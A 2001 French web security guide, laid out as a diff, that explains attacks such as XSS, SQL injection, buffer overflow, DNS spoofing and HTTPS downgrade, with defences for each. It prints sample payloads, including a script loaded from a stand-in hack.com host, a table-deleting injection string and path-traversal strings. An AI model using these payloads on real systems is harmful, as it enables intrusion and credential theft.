@@ -1,0 +1,572 @@
+﻿Sécurité des applications Internet
+  
+
+La sécurité est un élément important pour la publication d’une application sur Internet. Il faut s’occuper de protéger le serveur, mais également le client. C’est indispensable pour obtenir sa confiance. Ce document explique comment concevoir l'architecture et l'implémentation des services Internet pour qu’ils résistent aux attaques. Il s'adresse donc aussi bien aux architectes qu'aux développeurs, pour lesquels il peut constituer une méthode de conception d'applications sécurisées.
+Par Philippe PRADOS - 2001
+www.prados.fr
+Les applications Internet constituent des cibles privilégiées pour les hackers, car les attaques s’effectuent à distance et il est très difficile de remonter à l’auteur. Les attaques sont principalement de deux types : l'introduction dans le système pour y lire des informations sensibles ou y apporter des modifications préjudiciables à l’entreprise, ou la mise hors-service de l’application (c'est le DoS: Denial of Service, « déni de service »). La première forme s’apparente au banditisme, la deuxième au vandalisme.
+Une application présente sur le net doit essentiellement se protéger du banditisme, même si le vandalisme peut paralyser l’activité d’une entreprise dépendant exclusivement du net. L’attaque des sites comme Yahoo™ en février 2000 en a été une flagrante démonstration.
+Afin d’obtenir la confiance des clients, il est indispensable de les protéger et de le leur démontrer régulièrement. Les clients des sites Internet sont très volatiles. Le frein principal du commerce électronique ou des accès bancaire est la crainte de l’internaute quant à la sécurité de ses informations confidentielles : les sites doivent offrir une garantie de sécurité pour l’internaute. Ce n’est généralement pas le cas : de nombreux sites protègent leurs serveurs mais négligent les clients. Une étude effectuée en février 2000 sur dix sites bancaires français faisait apparaître que cinq d’entre eux ne protégeaient pas les clients.
+Pour proposer un site sécurisé, vous devez respecter un certain nombre de règles, justifiées par l’expérience. Il n’existe pas et il n’existera jamais de preuves de l’invulnérabilité d’un site. Il est nécessaire de se tenir régulièrement au courant des nouvelles attaques et des nouveaux « exploits » des hackers. Les sites devront être adaptés en conséquence. Un audit régulier du système complet doit être fait pour protéger le serveur et le client.
+Quelle que soit la complexité de la partie cliente, elle utilisera le réseau pour communiquer avec le serveur. Plusieurs attaques peuvent alors êtres mises en place :
+* Exploiter les bogues.
+* Ecouter la communication entre le client et le serveur pour obtenir des informations confidentielles (sniffer).
+* Se placer entre le client et le serveur afin de modifier partiellement les informations à la volée lors de la communication (« man in the middle » ou « homme au milieu »).
+* Rédiger un programme qui se fait passer pour un client ou un serveur et simule leur comportement (spoofing).
+Il existe de nombreux outils pour faire cela. Comment réagir face à ces quatre situations ? Quelles situations permettent aux hackers de s'introduire par des failles de sécurité ? La suite de ce document reprend les erreurs habituelles des sites Internet, de la plus simple à la plus complexe, et propose des parades pour chacune.
+Opération « Porte ouverte »
+Situation
+Un site propose un puzzle chronométré. Les dix utilisateurs les plus rapides peuvent participer à un tirage au sort afin de désigner le gagnant d’un téléphone portable.
+Piratage
+Le jeu étant chronométré, il n’est pas possible de le gérer depuis le serveur. Le trafic réseau est trop aléatoire. Tout le jeu devra être exécuté sur le client à l’aide de script. Les scripts sont publics et non protégés : une simple consultation du code source de la page HTML permet de comprendre comment le poste client envoie le temps mis par l’utilisateur pour la résolution du puzzle. Le hacker peut alors envoyer directement cette information avec un temps égal à zéro. L’URL http://www.telephone.com/Temps.html?temps=0 permet au pirate de gagner en indiquant un temps égale à zéro, voire un temps négatif ! Les responsables du site vont imaginer que l’utilisateur a eu une chance incroyable lors du mélange. Ils penseront que le puzzle s’est construit correctement de lui-même.
+Dans un autre site, la page permettant de modifier le mot de passe demande l’ancien et deux fois le nouveau. La vérification de l’ancien mot de passe est effectuée à l’aide de Javascript. Le mot de passe courrant est alors visible en clair ! En profitant de l’absence momentané d’un utilisateur, un usurpateur peut facilement le récupérer. Il demande la modification de celui-ci et regarde le source de la page.
+De même, de nombreux sites marchants indiquent le prix de l’article dans l’URL ou dans un champ caché. Un pirate peut très facilement modifier le prix et continuer son achat.
+Il ne faut pas s’appuyer sur les scripts pour protéger l’application.
+Perte de mémoire
+Situation
+Un site propose des informations personnalisées à l’utilisateur à la condition qu’il s’authentifie à l’aide d’un identifiant et d’un mot de passe.
+Piratage
+Microsoft Internet Explorer permet à l’utilisateur de sauver un mot de passe lorsqu’il remplit un formulaire. Cela lui évite d'avoir à le mémoriser. C’est très pratique lors de l’identification sur des sites non critique pour l’entreprise ou pour la vie privée du client. Par exemple, cela permet d’identifier les préférences de l’utilisateur lors de la consultation ultérieur du site.
+Mais, cela peut être une faille de sécurité. Si le client mémorise le mot de passe d’accès à son site bancaire par exemple, et qu’un autre utilisateur intervienne sur son poste, il peut utiliser ses mots de passe. Il existe également des programmes qui analysent la base de registre pour extraire tous les mots de passe de l’utilisateur. Ces programmes arrivent généralement sur le poste de la victime à l’aide de virus ou de cheval de Troie. Microsoft a prévu de limiter cela via un attribut aux tags input ou form interdisant la sauvegarde du mot de passe et des autres champs du formulaire.
+<input type="password" autocomplete="off">
+Ainsi, l’utilisateur ne peut plus sauver un mot de passe critique pour sa propre sécurité.
+Interdire la sauvegarde des mots de passes critiques.
+Qui me parle ?
+Situation
+Un formulaire propose à l’utilisateur d’entrer de nombreux champs. Certains sont numériques, d’autres textuels, certains dépendent les uns des autres ou doivent avoir des valeurs particulières. Afin d’améliorer l’ergonomie pour l’utilisateur, de gérer correctement les erreurs et de réduire le trafic réseau, toutes les vérifications de cohérence sont effectuées à l’aide de scripts, exécutés côté client avant l’envoi des informations sur le réseau. Si une donnée est erronée, le script la détecte. Il envoie un message à l’utilisateur pour lui demander de remédier au problème. Si par contre, toutes les informations sont valides, les champs du formulaire sont envoyés au serveur.
+Piratage
+Les applications Internet récupèrent des informations de la part des utilisateurs afin de les mémoriser, de les traiter et de les présenter. Un hacker peut facilement fournir des informations perverties afin de casser le système. Cela peut lui permettre d’obtenir des informations confidentielles, de pénétrer le réseau, etc.
+Les vérifications locales sur le poste du client ne sont pas suffisantes : un hacker peut facilement les contourner. Par exemple, les formulaires des pages HTML peuvent être vérifiées sur le poste client avant d’envoyer les informations vers le serveur. Les scripts permettent de faire cela facilement. Cela réduit le trafic réseau car les informations du formulaire ne sont envoyées que lorsque toutes les vérifications ont été faites.
+Le serveur doit impérativement vérifier à nouveau les champs avant de faire le traitement. En effet, il est facile d’envoyer des champs erronés, en utilisant une page HTML modifiée par exemple. Si un formulaire s’attend à ce qu’un champ possède une valeur numérique positive, vérifiez là aussi sur le serveur. Un hacker aura vite fait de tester votre application avec une valeur négative. Il pourra tester aussi des valeurs très grandes ou très longues pour tenter de provoquer un débordement de buffer pouvant faire exécuter sur le serveur un morceau de code judicieusement placé (voir plus bas).
+Il ne faut pas hésiter à faire une double vérification : une sur le client pour le confort de celui-ci ; une autre sur le serveur pour la sécurité.
+Il ne faut jamais faire confiance à la partie cliente de l’application
+D’où viens-tu ?
+Situation
+Un site permet d’être administré à distance par une communication sécurisée
+Piratage
+Un site anodin peut inclure dans une page l’émission d’un formulaire vers un autre site.
+Imaginons la situation suivante : un utilisateur s’authentifie sur le site d’administration. Sans quitter le navigateur, il se rend ensuite sur un autre site. Celui-ci envoie une page avec un formulaire caché et un script qui s’occupe de soumettre le formulaire sur le site d’administration. Étant donné que cette soumission est effectuée par le navigateur, celui-ci envoie également les éléments d’authentification constituée lors de la navigation précédente. La soumission pourra éventuellement lever des sécurités sur le site administré.
+Pour interdire cela, vérifiez dans tous les traitements de type POST, que l’en-tête Referer vient bien du même site. Cela permet d’interdire ce type d’attaque. Un POST ne peut être accepté que si la page précédente provient bien du même site.
+Qu’est-ce que tu dis ?
+Situation
+Un formulaire propose à l’utilisateur de signer le livre d’or du site. Lorsque l’utilisateur a entré ses commentaires et les a envoyés au serveur, ceux-ci sont ajoutés à la fin du livre d’or. Comme tous les internautes, il peut consulter le livre d’or pour connaître l’avis des autres visiteurs.
+Piratage
+Utiliser la valeur d’un champ transmis par le client sans vérification des caractères valides est dangereux. Plusieurs situations parmi d’autres peuvent être identifiées. Construction avec la valeur du champ :
+* d’une page HTML
+* d’une requête SQL
+* d’une commande shell (utilisation de CGI, de shell()ou popen() )
+Les informations transmises par le client peuvent être :
+* Des paramètres d’URL
+* Des paramètres d’un formulaire
+* Des cookies
+Avant d’utiliser un champ pour l’inclure dans une page HTML, supprimez tous les tags.
+Sinon, la page qui affichera le champ pourra contenir des scripts malicieux permettant de transmettre les informations d’un formulaire, d’accéder à des informations confidentielles dans une transaction sécurisée, etc… Par exemple, si l’utilisateur indique dans un champ :
+<script src=http://www.hack.com/hack.js
+  onLoad="hack()"></script>Très bon site !
+Le script hack.js sera exécuté lorsqu’un autre utilisateur consultera la page affichant le champ (sur un intranet par exemple). L’utilisateur pourra constater que la valeur est « Très bon site ! ». En fait, un script se sera subrepticement inclus dans la page. Il sera exécuté dans le contexte des autres utilisateurs. Il pourra récupérer le contenu ou les mots de passe des formulaires par exemple, et les envoyer à l’extérieur.
+Une autre approche consiste à renvoyer la page vers une page similaire sur un autre serveur.
+<meta http-equiv="refresh" content="0;url=http://www.hack.com/spoof.html">
+Le pirate pourra alors simuler le site officiel afin d’obtenir plus facilement des informations confidentielles.
+Construire une requête SQL à partir des champs de l’utilisateur est également dangereux. En effet, il est possible d’indiquer dans le champs des caractères particuliers qui vont permettre au hacker de casser la base de données. Par exemple, un point-virgule peut indiquer la fin d’une requête. Un utilisateur mal intentionné peut indiquer dans la valeur d’un champ: « X ; delete table produit ; select * from client». Si la requête sur le serveur est construite comme ceci : « select user from client where nom="+nom », le hacker va réussir à forger les trois requêtes suivantes : select user from client where nom=X ; delete table produit ; select * from client.
+Avant d’utiliser un champ pour construire le nom d’un fichier, vérifiez s'il correspond à une valeur légale. Evitez les chaînes du type ../, *, /, </etc/passwd, con, prn, aux, com1-4, lpt1-4, clock$, … Il est préférable d’utiliser des noms complets et de vérifier si les fichiers correspondants ne sont pas des liens logiques vers d’autres fichiers (instruction ln sous Unix).
+Avant d’utiliser un champ de l’utilisateur, traitez tous les caractères douteux (signes de ponctuation, tags, guillemets, etc.). Il y a plusieurs approches pour faire cela :
+* Les supprimer lors de l’entrée des données
+* Les encoder lors de l’émission des données.
+Supprimer les caractères lors de l’entrée des données peut être pénalisant pour l’utilisateur. Un texte sur les mathématiques peut très bien avoir besoin des caractères « inférieur » et « supérieur ». Il ne faut donc pas les supprimer des données.
+Encoder les caractères lors de l’émission des données peut présenter un risque, car il est plus facile d’oublier l’encodage lors de l’émission d’un champ. Il faut une certaine rigueur lors de la rédaction du site. Par exemple, un objet peut servir d’intermédiaire entre la page et les données métiers. Cet objet fera toutes les conversions nécessaires. La page n’utilise que cet objet pour présenter les données.
+Chaque caractère peut être encodé pour éviter d’être interprété par le navigateur comme une information de formatage. Par exemple, le caractère inférieur peut être converti en < lors de l’émission de l’information. Le caractère & doit, lui aussi être encodé. Pour cela, il ne faut pas oublier d’indiquer le jeu de caractère pour la page.
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+</head>
+<body>
+...
+</body>
+</html>
+Il ne faut plus utiliser les tags <jsp:getProperty …/> car ils n’encodent pas les données.
+Pour tester la validité d’un nom de domaine, vérifiez s’il ne possède pas de point-virgule ou de retour-chariot n’est pas suffisant. Vérifiez précisément qu’il est composé uniquement des caractères [A-Za-z0-9-] suivi d’un point, suivi d’un nom composé des caractères [A-Za-z0-9-].
+Pour tester la validité d’un e-mail, acceptez une variété de formats. Il ne faut pas se limiter au format classique utilisateur@serveur.net. Il existe de nombreux autres formats valides :
+nom_prenom@entreprise.com
+alex+@pitt.edu
+mi%aldan.UUCP@algebra.com
+user%host.domain@anon.penet.fi
+host1!host2!user/G=JABYML/S=MASONS/O=CUSTOMER/ADMD=FOOBAR/C=KZ/@gateway
+Référence : http://www.cert.org/tech_tips/malicious_code_mitigation.html
+De même, le nom d’un champs ne doit pas servir à manipuler une information technique de l’application. Par exemple, si le nom du paramètre sert à identifier la table de la base de données, le hacker pourra facilement consulter une autre table en choisissant un autre nom pour le champ du formulaire. L’introspection des formulaires pour alimenter des beans Java ou les composants COM de Microsoft est également dangereuse. Les beans et les composants doivent être rédigées scrupuleusement pour éviter la modification inopinée d’une propriété.
+Ne jamais utiliser les informations transmises par le client sans vérifier strictement les contraintes d’intégrité.
+En règle générale, il faut se méfier des invocations dynamiques (CORBA, COM, RMI) et de tous les langages non compilés (DHTML, SQL, XSL, shell, SQL, ECMA JavaScript, Visual Basic Script, etc). Ces langages sont du miel pour les hackers. Les langages non compilés sont généralement utilisés pour générer du code à la volée. Par exemple, les requêtes SQL utilisent des informations de l’utilisateur pour préciser les traitements à effectuer sur la base de données. Cela permet de valoriser des critères lors d’un SELECT. Du point de vue de la base de données, que la requête ait été le résultat d’une construction de chaîne de caractères ou non, le traitement sera interprété puis exécuté. Il est préférable d’utiliser des procédures stockées qui auront été préalablement compilées par la base de données. Il faut également faire attention aux fonctions d’invocation dynamique du type eval().
+Tu es trop bavard !
+Situation
+Un formulaire propose à l’utilisateur d’entrer une valeur. Celle-ci est manipulée sur le serveur afin de transmettre une nouvelle page affichant le résultat des manipulations.
+Piratage
+Pour devenir administrateur, les hackers recherchent des débordements dans la gestion des tampons mémoire (buffer overflow).
+Si un programme utilise un paramètre d’une fonction pour le recopier dans un tampon présent dans la pile, le hacker va s’arranger pour livrer un paramètre dont la taille dépasse la taille du tampon de réception.
+// Programme C ANSI
+void f(const byte* param)
+{
+  byte buf[1024];
+  memcpy(buf,param);
+  …
+}
+Le hacker va appeler la fonction f() avec un paramètre dont la taille dépasse 1024 octets. Avant l’appel, la pile du microprocesseur ressemble à ceci :
+  
+
+Le hacker va s’arranger pour modifier l’adresse de retour de la fonction afin d’exécuter un petit programme assembleur qui lancera un autre processus. Pour cela, il donnera un tampon supérieur à 1024 caractères. Il va bénéficier du débordement du tampon pour modifier l’adresse de retour de la fonction.
+  
+
+Lorsque la fonction f() cherche à retourner à l’appelant par un return, elle va retourner à l’adresse du petit programme présent dans le tampon et l’exécuter. En général, le traitement lance un shell ou télécharge un programme plus important. Le hacker a ainsi démarré un processus avec les droits attribués au serveur. Il n’a pas eu besoin de connaître de mot de passe pour prendre la main sur la machine et en avoir ainsi le contrôle total.
+Ne jamais manipuler de tampon mémoire sans en vérifier la taille.
+Cela est vrai également pour les chaînes de caractères. L’instruction strcpy() du C/C++ est à bannir. Il faut lui préférer strncpy(). Java et Smalltalk ne présentent pas ce risque (excepté le cas de bogues dans la machine virtuelle) car il n’y a pas de manipulation directe de la mémoire.
+Pour pouvoir faire cela, le hacker doit demander un traitement au processus. Il va modifier toutes les informations extérieures, utilisées par le programme. Cela concerne :
+* Les paramètres de la ligne de commande,
+* Les variables d’environnement,
+* Les entrées claviers,
+* Les fichiers,
+* Les librairies dynamiques,
+* Les requêtes dans les protocoles (socket, pipe, port série, infrarouge…)
+Il va utiliser des valeurs arbitrairement longues et uniformes ; par exemple, une longue suite de ‘x’. S’il arrive à faire planter le programme, il regarde la valeur des registres. Si certains d’entre eux possèdent la valeur du caractère ‘x’, il peut en déduire qu’il existe une possibilité de débordement de buffer. Il ne lui reste plus qu’à utiliser son débuggeur pour calculer la position de l’adresse de retour de la fonction, puis écrire un petit programme alimentant le tampon correctement.
+Les droits accordés au processus du serveur doivent êtres ajustés au minimum. Celui-ci doit s’exécuter sous un utilisateur ayant des droits limités. Cela n’empêchera pas un hacker de devenir administrateur s'il arrive à démarrer son propre processus dans ce contexte de sécurité, mais il aura plus de difficultés. En général, on considère qu’un utilisateur quelconque d’un poste, peut devenir administrateur.
+Vrais - faux papiers
+Situation
+Un provider permet aux utilisateurs de consulter leur messagerie sans entrer de mot de passe. Pour cela, l’adresse IP donnée à l’utilisateur lors de la connexion par modem sert à l’identifier.
+Piratage
+Il existe des techniques pour prendre l’identité d’une autre machine. Avec des paquets particuliers sur le réseau, émis au bon moment, il est possible de répondre à la place d'un serveur DNS et de prendre ainsi l’identité de n’importe quelle machine. De même, il est possible d’écouter les communications ou de prendre l'adresse IP d’une cible. Ainsi, il est facile de consulter les boîtes aux lettres de tous les abonnés aux providers.
+Pour réduire les risques d’usurpation d’identité, on peut cumuler différentes techniques pour vérifier l’identité du client. Par exemple, pour vérifier l’utilisateur d’une session HTTP, il est possible de comparer l’adresse IP du client avec l’adresse présentée lors de la création de la session. Cela réduit les possibilités à un hacker de se faire passer pour la victime. Cela ne fonctionne pas toujours, car dans certaines situations, il existe un groupe de proxies dans l’entreprise. Pour la même page, le client peut passer par différents proxies. Le serveur aura alors plusieurs adresses IP pour le même client.
+Il est préférable d’utiliser des certificats numériques X.509 et des communications cryptées, seuls outils permettant de connaître précisément le client et le serveur. Les deux intervenants doivent être identifiés. Le seul risque résiduel est le vol de la clé privée du client. Si celui-ci s’en rend compte, il peut révoquer son certificat et en générer un autre. Lors de la réception d’un certificat électronique, vérifiez s’il ne fait pas partie de la liste des certificats révoqués (CRL: Certificate Revocation List). Cette liste doit régulièrement être mise à jour.
+Il ne faut pas utiliser l’adresse IP, le numéro de la carte réseau ou le serveur DNS pour identifier le poste client.
+Clair - obscure
+Situation
+Un site utilise le Basic Authentification du protocole HTTP pour demander à l’utilisateur de s’identifier. Afin de protéger cela, la hiérarchie correspondante impose le protocole HTTPS.
+Piratage
+Le protocole HTTP permet à l’utilisateur de s’identifier. Pour cela, lorsqu’un l’utilisateur demande une page sous le répertoire /ident, par exemple, il reçoit une erreur 401 pour indiquer que l’accès au document est interdit. Le navigateur propose alors une boîte de dialogue lui demandant d’entrer son nom et son mot de passe. Le navigateur redemande ensuite la même page en ajoutant dans la requête les informations d’identification. Un en-tête Authorization possède alors les informations en claire sous la forme nom:mot-de-passe. Une écoute du réseau permet de les obtenir. Pour éviter cela, épaulez l’identification de l’utilisateur avec le protocole TLS (ex. SSL). Ainsi, il n’est plus possible de consulter directement l’en-tête Authorization. La requête est entièrement cryptée.
+Une fois que l’utilisateur a renseigné ces informations, elles seront envoyées pour toutes les requêtes concernant les pages présentes sous le répertoire /ident, que celles-ci utilisent ou non le protocole TLS. Le hacker va alors forcer le navigateur à demander une page dans cette hiérarchie, sans utiliser le protocole sécurisé. Comment forcer un utilisateur à demander une de ces pages non sécurisées ? Il faut d’abord attendre que la victime utilise une page sécurisée. Le hacker ne peut rien écouter de la conversation, mais il en déduit que le mot de passe a été renseigné dans le navigateur. Il attend alors une requête quelconque sur une page non sécurisée, et procède en trois étapes. Lorsque l’utilisateur demande une page non sécurisée, /index.html par exemple, le proxy du hacker retourne une demande de relocation vers la page de la branche authentifiée : /ident/index.html, sans le protocole https. Lorsque cette page est demandée, il récupère le mot de passe en clair émis par le navigateur, et retourne à nouveau une relocation vers la page initiale : /index.html.
+  
+
+Ce protocole permet au hacker de forcer le navigateur à émettre le mot de passe en clair. Tant que le protocole ou les navigateurs n’ont pas évolué,
+Il existe une autre approche, moins discrète. L’utilisateur ne peut pas savoir, lors de l’introduction du mot de passe, si le protocole utilisé est sécurisé. Un pirate peut transformer une signature HTTPS en signature HTTP afin d’obtenir le mot de passe. Il retourne alors une relocation vers la page sécurisée. L’utilisateur doit à nouveau entrer son mot de passe, pensant avoir fait une erreur.
+Une nouvelle version de ce protocole améliore les choses (RFC 2069). L’identifiant et le mot de passe ne sont plus transmis en clair. Une signature calculée à partir d’informations données par le serveur permet de vérifier de la possession du mot de passe. Suivant le paramétrage, une session ne pourra pas être réutilisée par un pirate, ou alors pendant un très court laps de temps. Pour utiliser cela, imposez ce protocole aux navigateurs, sinon, un hacker peut transformer une demande avec la nouvelle version en une demande avec l’ancienne. Malheureusement, les navigateurs ne sont pas encore à jour. Ils devront garder l’ancienne version pendant longtemps.
+Les amis de mes amis sont mes ennemis
+Situation
+Un client transmet des informations à un serveur Internet. Celui-ci interroge une base de données pour vérifier les droits de l’utilisateur.
+Piratage
+Si un client envoie une requête à un serveur, et que celui-ci à besoin d’informations complémentaires via un autre serveur (SGBDR par exemple), le hacker peut s’introduire dans la communication pour répondre à la place du deuxième serveur.
+  
+
+Lorsque le client émet une requête vers le serveur HTTP, il sait que cela entraîne une requête vers la base de données relationnelle. Il peut répondre avant la base de données à la requête. Un moyen pour protéger la communication entre le serveur et la base de données consiste à utiliser une communication sécurisée. Une autre approche consiste à paramétrer le pare-feu pour interdire toute communication entre le client et le serveur autre que via les ports et les machines autorisées.
+Cette technique est utilisée pour usurper l’identité d’une machine. Lorsque l’adresse d’un domaine est demandée à un serveur DNS pour la première fois, celui-ci transmet la requête à un autre serveur DNS. Le hacker peut répondre avant le deuxième DNS afin de fournir une adresse IP erronée.
+  
+
+Le serveur DNS de l’entreprise mémorise l’association entre www.ma-banque.com et l’adresse IP 9.0.0.1, car c'est l'adresse qu'il a reçue en premier. L’information erronée reste dans le cache du serveur DNS de l’entreprise. Lorsque d’autres utilisateurs vont demander la résolution du nom www.ma-banque.com, ils vont obtenir l’adresse IP : 9.0.0.1, c'est-à-dire le serveur du hacker. Il peut ainsi se placer en position « d’homme au milieu ».
+Pour augmenter la confiance que l’on accorde à la résolution d’un nom de domaine, on peut effectuer une vérification inverse (reverse lookup) : demander le nom associé à l’adresse 9.0.0.1. Ce n’est pas une garantie absolue, mais cela limite les possibilités du hacker. Vous pouvez également utiliser une adresse IP en dur à la place d’un nom de domaine.
+S’il existe une communication entre deux serveurs, celle-ci doit être sécurisée.
+Il faut également vérifier la cohérence entre la question et la réponse. En effet, une des attaques des serveurs DNS consiste à répondre à la question « Quelle est l’adresse IP de abc.monsite.com ? » par « L’adresse IP de www.ma-banque.com est 1.2.3.4 ». La réponse ne correspond pas à la question.
+Se méfier des intermédiaires
+Situation
+Un site demande à l’utilisateur de s’authentifier, puis lui fournit des pages personnalisées, suivant différents critères.
+Piratage
+Le protocole HTTP autorise l’utilisation de proxies. Un proxy est typiquement un « homme au milieu ». Le proxy peut mémoriser des informations confidentielles, et ces informations peuvent être accédées par un autre utilisateur, ou via un backup.
+Par exemple, un utilisateur demande la consultation du solde de son compte. La page HTML lui revient, mais sans paramètre particulier vis-à-vis du cache. La page est alors mémorisée dans le proxy. Puis un autre utilisateur demande la même page. Le proxy estime que celle-ci n’a certainement pas été modifiée depuis la dernière consultation. Il retourne alors la page du cache, sans la demander au serveur HTTP. Le deuxième utilisateur peut alors consulter les informations du premier.
+  
+
+Pour demander au proxy de ne pas cacher certaines pages, paramétrez correctement l’en-tête HTTP cache-controle. Attention, cela n’interdit pas au hacker de modifier le serveur proxy pour mémoriser les informations. Une entreprise doit placer celui-ci sur un poste sécurisé et avoir confiance en son administrateur.
+* La valeur private permet d’indiquer que la page appartient à un utilisateur particulier. Le cache ne peut pas être partagé. D’autres utilisateurs demandant la même page devront transiter par le serveur HTTP. Ils ne pourront pas utiliser la version privée présente dans le proxy.
+* La valeur no-cache demande au proxy de ne pas cacher le document. Les différents en-têtes peuvent être cachés par le serveur proxy, mais pas les données.
+* La valeur no-store demande au proxy de garantir qu’en aucun cas le fichier et les en-têtes ne seront sauvegardés, même par une procédure de backup. Tout doit fonctionner en mémoire.
+Pour garantir la confidentialité, indiquez dans l’en-tête Cache-controle, les valeurs private et no-store.
+Cache-controle : private, no-store
+Contrôlez précisément les caches du protocole HTTP.
+Secret défense
+Situation
+Un site bancaire propose dans sa page de garde différentes informations publiques. Pour accélérer la prise en compte de la consultation des comptes par un client, la page propose un formulaire de signature. L’envoi des informations du formulaire utilise le protocole HTTPS afin de garantir la confidentialité du mot de passe.
+Piratage
+Un site sécurisé qui utilise HTTPS doit envisager la possibilité qu’un hacker se place entre le client et le serveur (« l’homme au milieu »). Dans cette situation, que peut-il faire ? Cela dépend.
+On trouve souvent la situation suivante : une page non sécurisée demande à l’utilisateur de s'authentifier. La page indique clairement que le nom et le mot de passe sont envoyés cryptés. En effet, l’envoi du formulaire utilise le protocole HTTPS. En écoutant le réseau, il n’est pas possible de connaître l’identifiant. Mais, le hacker peut modifier dynamiquement la page HTTP du formulaire pour ne plus utiliser le protocole HTTPS.
+<form action="https://www.mon-site.com/login.html" method="post">
+User:<input name="user"><br>
+Password:<input type="password" name="password"><br>
+<input type="button" value="Ok">
+</form>
+Sera transformé à la volée par le hacker en :
+<form action="http://www.mon-site.com/hack.html"
+  method="post">
+User:<input name="user"><br>
+Password:<input type="password" name="password"><br>
+<input type="button" value="Ok">
+</form>
+La demande de la page hack.html sera capturée par le pirate. Il pourra ainsi obtenir facilement les informations voulues. En retour, il demandera au navigateur de réémettre le formulaire sur l’URL sécurisée. Pour cela, il retourne un en-tête Relocation après avoir mémorisé les informations du formulaire.
+HTTP/1.0 302 Relocation
+Location: https//www.mon-site.com/login.html
+Le schéma du traitement est le suivant.
+  
+
+L’utilisateur ne verra rien. Les champs user et password auront été émis deux fois par le navigateur : une fois non sécurisés et une fois sécurisés. L’utilisateur n’en saura rien. Quelle que soit la longueur de la clé utilisée pour le cryptage de la communication HTTPS, le hacker aura obtenu l’information qu’il convoitait.
+Le protocole HTTP impose que la réception d’une demande de relocation lors de l’envoi d’un POST entraîne la réémission des informations du formulaire dans la nouvelle localisation. Le status 302 ne doit pas entraîner la transformation d’un POST en GET. C’est pourtant ce que font généralement les navigateurs. Le hacker a alors moins de possibilités d’être discret. Il peut tenter de transformer l’envoi du formulaire de type POST en envoi du type GET. Pour cela, il ajoute les champs du formulaire dans l’URL de relocation.
+302 Relocation Location: https//www.mon-site.com/login.html?User=Alibaba&Pass=sesame
+Généralement, les pages acceptent indifféremment les deux formats. L’un étant facilement convertible en l’autre. Pour limiter les possibilités du hacker, dans ce type de page, il ne faut pas autoriser une utilisation de type GET, mais uniquement une utilisation de type POST. Cela n’est qu’un pis-aller, car les navigateurs devraient théoriquement respecter la norme HTTP et renvoyer le formulaire avec le bon type.
+Une autre approche du pirate consiste à retourner une page avec un formulaire transparent, dont tous les champs sont hidden et de forcer le submit à l’aide d’un script.
+<form action="https://www.mon-site.com/login.html"
+  method="post">
+<input type="hidden" name="User" value="Alibaba">
+<input type="hidden" name="Pass" value="sesame">
+</form>
+<script>
+<!--
+document.forms[0].submit();
+//-->
+</script>
+Pour utiliser correctement le protocole HTTPS, il faut que le formulaire utilise également ce protocole. Ainsi, il n’est plus possible de modifier la page de signature. Le navigateur indiquera un cadenas pour informer l’utilisateur que tout est sécurisé. Si le hacker modifie la page de signature pour ne plus utiliser le protocole HTTPS, l’utilisateur en sera informé par l’absence du cadenas.
+Dans une page constituée de plusieurs sections (frames), il ne faut pas mélanger des frames en HTTPS avec d’autres frames en HTTP. Le navigateur n’affiche pas le cadenas car il estime qu’il y a un risque. En effet, le hacker pourra facilement supprimer les pages HTTPS pour les remplacer par des pages équivalentes utilisant le protocole HTTP. L’utilisateur n’a pas de moyen simple de savoir si la section critique est vraiment sécurisée. Si le cadenas est présent, il peut être tranquille. Pour cela, toutes les pages de tous les frames doivent utiliser le protocole sécurisé. Les pages qui lui sont présentées n’ont pas été modifiées. Sinon, l’une d’elles peut l’avoir été. Cela hypothèque la confiance sur toutes les pages.
+Utilisez correctement le protocole HTTPS, même sur la page de formulaire.
+Maquillage
+Situation
+Un site demande à l’utilisateur de se signer dans une sous-fenêtre sécurisée. Celle-ci affiche la barre de statut afin de permettre à l’utilisateur de vérifier que la page n’a pas été modifiée.
+Piratage
+La page qui ouvre la sous-fenêtre n’est pas sécurisée. Un hacker peut modifier les paramètres d’ouverture pour supprimer l’affichage de la barre de statut, et l’utilisation du protocole HTTPS. Il attend alors la demande de la page de signature non sécurisée, et va y inclure deux images simulant la barre de statut.
+
+
+  
+  
+
+Pour éviter cela, il faut que la page de signature utilise la page courante du navigateur. En effet, il n’est pas possible de supprimer la barre de statut à une fenêtre ouverte.
+Gâteau avarié
+Situation
+Un utilisateur remplit un panier virtuel lors de la consultation d’une boutique en ligne. Le serveur identifie l’utilisateur à l’aide d’un cookie désignant la session en cours.
+Piratage
+Pour suivre les requêtes de l’utilisateur, il est d’usage d’utiliser des cookies. Un cookie est une information opaque, émise par le serveur, et qui sera réémise par le client pour toutes les requêtes dans la même branche de la hiérarchie du serveur. Cela permet de retrouver le contexte de l’utilisateur. Attention, c’est le cookie qui identifie l’utilisateur, pas son couple nom - mot de passe. En effet, si l’utilisateur s'authentifie à l’aide d’un formulaire, il va obtenir un cookie. Il peut alors naviguer sur d’autres pages sans avoir besoin de s'authentifier à nouveau. Le serveur accepte la navigation car il existe une session ouverte pour le cookie envoyé par le navigateur.
+Si un hacker écoute le réseau, il peut connaître la valeur du cookie. Ainsi, il peut voler la session de l’utilisateur et obtenir des informations sur la session courante (panier en cours, numéro de carte de crédit, etc).
+De même, si l’algorithme de génération des cookies de session est trop simple, le hacker va être capable de générer des cookies valides pour voler des sessions en cours. Par exemple, imaginons que le cookie indique un numéro d’ordre des sessions. Le premier client obtient Set-Cookie: session=1 ; le suivant Set-Cookie: session=2, etc. Pour produire un cookie crédible, le hacker va se connecter au serveur pour connaître le numéro de session courant. Par exemple, il obtient : Set-Cookie: session=987. Il va alors chercher à voler les sessions 986 et précédentes.
+Les algorithmes de génération des cookies ne sont jamais aussi triviaux. Parfois, ils ajoutent un timestamp afin d’ajouter une donnée aléatoire. Ce n’est pas une bonne méthode. En effet, le hacker peut calculer le timestamp utilisé pour sa propre session et chercher un numéro de session précédent, généré depuis cinq minutes. Il va tester toutes les secondes possibles pour un numéro de session immédiatement inférieur.
+L’algorithme de génération des cookies doit être sécurisé. Une technique consiste à signer électroniquement le cookie, éventuellement à l’aide d’une clé symétrique générée aléatoirement lors de chaque lancement du serveur. À ce niveau, faite très attention à la qualité de son générateur de nombres aléatoires et à son initialisation. Tout défaut restreindra l'espace de génération des cookies et facilitera la recherche d'un cookie valide par un hacker.
